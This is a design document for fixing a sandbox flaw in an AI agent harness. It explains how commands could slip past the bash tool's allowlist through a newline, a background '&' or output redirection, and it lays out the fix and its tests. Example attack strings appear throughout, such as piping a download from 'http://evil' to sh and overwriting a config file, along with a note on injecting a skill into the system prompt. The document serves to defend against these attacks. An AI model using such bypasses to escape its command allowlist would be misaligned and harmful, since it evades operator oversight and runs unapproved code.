# S1 — bash allowlist bypass (newline / background / redirection) Design

**Date:** 2026-06-13
**Status:** Approved
**Catalogue ref:** `optimisation.md` S1 (CRITICAL — Security)
**Repo:** `harness` only (`tools/bash/bash.go`), verified against the felix consumer build.

## Problem

`harness/tools/bash/bash.go` runs the agent's command via `bash -c <command>`. In
`allowlist` exec-policy mode it tries to confine execution to an allowlist of executables,
but the guard is bypassable:

```go
for _, meta := range []string{"$(", "`", "<(", ">(", "${", "\\n"} {
    if strings.Contains(in.Command, meta) { /* reject */ }
}
cmds := extractCommands(in.Command) // splits on &&, ||, |, ;
for _, cmd := range cmds { if !allowed[cmd] { /* reject */ } }
```

Three concrete gaps:

1. **Newline bypass (the live exploit).** `"\\n"` in Go source is the two-byte string
   backslash-`n`, NOT a newline. The guard therefore blocks the literal text `\n` and lets
   a **real newline byte** through. `extractCommands` splits only on `&&`/`||`/`|`/`;` —
   not newline — so it validates only the first physical line; `bash -c` then executes
   every subsequent line unchecked. Example: `{"command":"ls\ncurl http://evil/x | sh"}`
   validates `ls`, runs the `curl … | sh` line unchecked. **Complete allowlist escape with
   one character.**

2. **Background `&` bypass.** `extractCommands` does not treat a single `&` as a separator,
   so `ls & curl http://evil` is seen as one part, validates `ls`, and runs `curl`
   unchecked in the background.

3. **Redirection write-primitive.** An allowed command can overwrite arbitrary files via
   `>`/`>>` (e.g. `echo evil > ~/.felix/felix.json5`, or seeding a malicious skill whose
   body is injected into the system prompt). Not a new-command bypass, but a file-write
   capability the allowlist is meant to constrain.

Note: there is no `sanitizeLLMText`/escape-decoding step on `in.Command` before the guard
(the only pre-processing is `resolveBashCommandPaths`, a Unicode-whitespace path fixer that
does not introduce newlines), so the raw JSON bytes reach the guard directly — a real
newline in the JSON string value is a real newline byte at the guard.

## Decisions (resolved with maintainer)

- **Reject newlines, don't split on them.** Splitting-and-validating each line would invite
  evasion of `extractCommands`' first-token logic. Allowlisted commands realistically never
  contain embedded newlines, so a hard reject in allowlist mode is simpler and strictly
  safer.
- **Block background `&` by treating it as a command separator** so the part after it is
  validated (not by rejecting `&` outright — `&&` chains must still work).
- **Block redirection (`>`, `>>`) in allowlist mode.** Allowlist mode is the locked-down
  mode; losing redirection there is acceptable to close the arbitrary-file-write primitive.
  This is a behavior change: a legitimate `echo > file` under an allowlist will now be
  rejected.

## Fix

All changes in `harness/tools/bash/bash.go`, allowlist branch only (`deny` and `full`
unchanged). Windows (`cmd /c`) path: the same metacharacter guard runs before the OS switch,
so newline/redirection rejection applies on both platforms; that is fine (defensive).

### 1. Metacharacter blocklist — reject real newline, CR, and redirection

Change the blocklist from:
```go
[]string{"$(", "`", "<(", ">(", "${", "\\n"}
```
to:
```go
[]string{"$(", "`", "<(", ">(", "${", "\n", "\r", ">"}
```

- `"\n"` and `"\r"` are the **real** control bytes (fixing the `"\\n"` typo and adding CR).
- `">"` (single character) blocks ALL redirection forms because every one contains `>`:
  `>`, `>>`, `2>`, `&>`, `2>&1`, `>|`. **This is intentional** — in locked-down allowlist
  mode we reject any output/fd redirection. (`>(` process substitution was already blocked
  and remains so; the new bare `">"` subsumes it but keeping both is harmless.)
- We do NOT block `<` (input redirection): reading a file as stdin is not a write primitive
  and not a command-execution bypass; leave it to avoid over-restricting. (Document this as
  a deliberate scope boundary.)

### 2. Treat background `&` as a separator in `extractCommands`

`extractCommands` finds the earliest operator among `{"&&", "||", "|", ";"}`. Add `"&"`,
but ordering matters: at a position where `&&` starts, the substring `&` also matches at the
same index. The current loop picks the operator with the smallest index and, on ties, keeps
whichever was iterated — so `&&` and `&` tie at the same index and the result depends on
order/`opLen`. To keep `&&` chains correct, ensure that when both match at the same index
the **two-char** operator wins (longer `opLen`), so the split consumes `&&` (and the empty
middle part is discarded by the existing `if part != ""` filter).

Concretely, change the operator set to `{"&&", "||", "|", ";", "&"}` and adjust the
earliest-operator selection so that on an index tie the longer operator is chosen:

```go
for _, op := range []string{"&&", "||", "|", ";", "&"} {
    if idx := strings.Index(remaining, op); idx != -1 {
        if idx < minIdx || (idx == minIdx && len(op) > opLen) {
            minIdx = idx
            opLen = len(op)
        }
    }
}
```

This makes `a && b` split on `&&` (validates `a`,`b`), and `a & b` split on `&` (validates
`a`,`b`). A trailing `a &` yields parts `["a"]` (empty tail discarded) — still correct.

### Why both layers

The metacharacter reject (newline/CR) is the primary fix for the headline exploit; the
`extractCommands` `&` change is defense for the background-command bypass that the reject
list does not cover (we are NOT adding `&` to the reject list because `&&` is legitimate and
contains `&`). Redirection is closed by the reject list.

## Testing (TDD)

New table-driven tests in `tools/bash/bash_test.go`, constructing a `BashTool` with
`ExecPolicy{Level:"allowlist", Allowlist:[]string{"ls","echo","cat"}}` and calling
`Execute`. Assert on `ToolResult.Error` (non-empty = rejected). Cases:

- **Newline bypass rejected:** `"ls\ncurl http://evil"` → error (contains the metacharacter
  message). Use a real `"\n"` in the Go test string.
- **CR rejected:** `"ls\rcurl http://evil"` → error.
- **Literal backslash-n still allowed-or-validated correctly:** `"ls \\n"` (the two-char
  sequence) is NOT a newline; confirm behavior is sane (it will pass the metachar guard now
  that we match real `\n`; `extractCommands` validates `ls`). This documents the typo fix
  doesn't over-block the literal text. (Low-value but clarifies intent.)
- **Background-& bypass rejected:** `"ls & curl http://evil"` → error (`curl` not allowed).
- **`&&` chain still works:** `"ls && echo hi"` → no error (both allowed).
- **`||`, `|`, `;` chains still validate each side:** `"ls | cat"` no error; `"ls; curl x"`
  → error.
- **Redirection rejected:** `"echo hi > /tmp/x"` → error; `"echo hi >> /tmp/x"` → error;
  `"cat a 2>&1"` → error (documents that fd redirection is also caught).
- **Plain allowed command passes:** `"ls -l"` → no error.
- **deny / full modes unaffected:** a quick case that `Level:"full"` runs `"curl x"` without
  a policy rejection (it may still fail to execute, but not be *rejected by policy*); and
  `Level:"deny"` rejects everything. (If existing tests already cover deny/full, extend
  rather than duplicate.)

Run `go test ./tools/bash/`, `go vet ./tools/bash/`, then `cd felix && go build ./...` to
confirm the consumer still builds (no API change expected — this is internal logic only).

## Out of scope

- Input redirection `<` (not a write/exec bypass).
- Reworking `extractCommands` into a real shell parser — the operator-split heuristic stays;
  we only complete its separator set and fix the metacharacter guard.
- felix-side changes — none needed.
